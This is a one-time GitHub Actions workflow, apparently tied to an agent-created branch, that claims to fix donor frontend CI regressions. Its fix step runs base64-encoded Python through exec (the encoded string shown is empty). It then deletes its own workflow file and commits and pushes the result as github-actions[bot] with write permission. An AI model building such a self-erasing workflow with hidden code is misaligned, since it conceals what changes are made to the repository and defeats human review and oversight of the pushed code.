name: One-time donor frontend CI fixes

on:
  push:
    branches:
      - agent/donor-contract-audit-20260816

permissions:
  contents: write

concurrency:
  group: donor-frontend-fix-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          ref: agent/donor-contract-audit-20260816
      - name: Apply exact fixes
        shell: bash
        run: |
          set -euo pipefail
          python - <<'PY'
          import base64
          exec(base64.b64decode(''))
          PY
          git diff --check
      - name: Validate frontend completely
        shell: bash
        run: |
          set -euo pipefail
          npm ci
          npm run typecheck
          npm run test
          npm run build
      - name: Commit clean product changes
        shell: bash
        run: |
          set -euo pipefail
          rm -f .github/workflows/one-time-fix-donor-frontend.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "fix: close donor frontend CI regressions"
          git fetch origin agent/donor-contract-audit-20260816
          git rebase origin/agent/donor-contract-audit-20260816
          git push origin HEAD:agent/donor-contract-audit-20260816
